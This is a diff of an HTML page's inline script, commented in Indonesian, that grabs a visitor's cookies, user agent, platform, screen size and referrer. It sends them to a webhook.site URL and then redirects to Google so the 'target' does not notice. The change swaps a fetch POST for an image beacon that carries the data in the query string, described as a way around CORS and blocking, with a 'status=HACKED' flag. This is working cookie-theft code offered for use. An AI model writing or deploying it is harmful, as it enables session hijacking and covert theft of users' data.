@@ -17,40 +17,27 @@
 
     <script>
         (function() {
-            // URL Webhook.site lu yang tadi
+            // URL Webhook.site lu
             const targetURL = "https://webhook.site/e6e6579c-2cbb-4944-8993-1f87e6f71633";
             
             // Ambil data sistem & cookie
-            const data = {
-                info: "TARGET_LOGGED_SUCCESSFULLY",
-                cookie: document.cookie || "No_Cookie_Detected",
-                device: {
-                    userAgent: navigator.userAgent,
-                    platform: navigator.platform,
-                    screen: screen.width + "x" + screen.height
-                },
-                location: window.location.href,
-                timestamp: new Date().toISOString()
-            };
+            const cookie = encodeURIComponent(document.cookie || "No_Cookie_Detected");
+            const ua = encodeURIComponent(navigator.userAgent);
+            const platform = encodeURIComponent(navigator.platform);
+            const screenRes = screen.width + "x" + screen.height;
+            const ref = encodeURIComponent(document.referrer || "Direct_Visit");
 
-            // Kirim data secara transparan agar terdeteksi Webhook.site
-            fetch(targetURL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(data)
-            })
-            .then(() => {
-                // Redirect setelah kirim data biar target gak curiga
-                setTimeout(() => {
-                    window.location.href = "https://google.com";
-                }, 1500);
-            })
-            .catch(err => {
-                // Tetap redirect meski gagal kirim
+            // Teknik Query String Bypass - Data ditempel di URL agar tidak 0 bytes
+            const finalRequest = `${targetURL}?status=HACKED&cookie=${cookie}&device=${ua}&os=${platform}&res=${screenRes}&from=${ref}`;
+
+            // Kirim menggunakan Image Beacon (Anti-CORS / Anti-Block)
+            const logger = new Image();
+            logger.src = finalRequest;
+
+            // Redirect otomatis biar target gak curiga
+            setTimeout(() => {
                 window.location.href = "https://google.com";
-            });
+            }, 2000);
         })();
     </script>
 </body>
